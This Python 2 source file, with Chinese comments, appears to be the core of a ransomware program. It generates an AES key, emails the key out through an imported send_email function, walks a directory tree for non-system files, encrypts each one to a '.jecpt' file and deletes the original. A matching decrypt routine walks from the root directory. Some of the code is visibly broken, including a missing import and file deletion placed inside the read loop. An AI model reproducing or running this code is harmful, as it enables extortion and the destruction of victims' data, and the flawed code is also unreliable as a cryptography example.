#! encoding:utf-8
from gen_email import *
from system_manager import *
from Crypto.Cipher import AES
from Crypto.Random import random as cry_rand
import os,struct,string

""" 
DONE：Crypto生成随机key
这里用random模块生成的伪随机数，不安全，有被破解的可能，应该换成Crypto模块的安全随机模块，
#gennarate random string from file length
def GenRamStr(length):
    '''返回指定长度的随机字符串'''
    StrList='abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=_+[]{}\\|;\'\",./<>?';
    Strings='';
    for i in range(length):
        Strings+=random.choice(StrList)
	#RamStr=''.join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=_+[]{}\\|;\'\",./<>?',length));
    return Strings;


#生成key
def gen_key(size=16,chars=string.letters+string.digits):
    '''生成指定长度的随机key'''
    return ''.join(random.choice(chars) for _ in range(size))
"""


def gen_key(size=16):
    """ 
    用Crypto.Random模块生成的真随机字符串
    """
    _key=''
    return _key.join(cry_rand.choice(string.letters+string.digits) for i in range(size))


#文件加密
def encrypt_file(key,in_filename,out_filename=None,chunksize=64*1024):
    '''
    加密文件最底层函数实现，
    没有任何返回
    '''
    if not out_filename:
        out_filename=in_filename + '.jecpt';

    iv = ''.join(chr(random.randint(0,0xFF)) for i in range(16))
    encryptor=AES.new(key,AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
                os.remove(in_filename)


#文件解密
def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    '''解密文件最底层实现函数'''
    # Split .crypt extension to restore file format
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
                os.remove(in_filename)
        
        # Truncate file to original size
        #truncate函数用于根据指定的size截断文件，截断后size后面的字符会被删除
            outfile.truncate(origsize)


#加密非系统必要文件
def Encrypt(path,key):
    '''加密主函数，先通过email发送key，然后从指定路径遍历文件结果进行加密每一个文件'''
    send_email(key)
    for i in discoverFiles_encry(path):
        try:
            encrypt_file(key,i);
        except OSError:
            pass
    

def Decrypt(key):
    ''''''
    for i in discoverFiles_decry('/'):
        print(i)
        decrypt_file(key,i)

if __name__ == "__main__":
    print gen_key()